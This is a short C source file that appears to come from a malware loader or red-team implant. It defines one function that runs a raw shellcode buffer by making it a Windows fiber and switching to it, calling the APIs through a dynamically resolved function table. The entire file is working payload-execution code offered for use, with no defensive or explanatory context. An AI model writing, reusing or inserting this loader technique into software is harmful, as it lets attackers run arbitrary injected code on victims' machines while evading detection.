#include <windows.h>
#include <core/fibers.h>
#include <core/win32.h>

void ExecViaFibers( _In_ INSTANCE pInstance, _In_ PBYTE ByteCodes){

    LPVOID ShellFibersAddr = NULL;

    if(!(ShellFibersAddr = pInstance.Api.pCreateFiber(0x00, (LPFIBER_START_ROUTINE)ByteCodes, NULL))){
        return;
    }

    if(!(pInstance.Api.pConvertThreadToFiber(NULL))){
        return;
    }

    pInstance.Api.pSwitchToFiber(ShellFibersAddr);

}
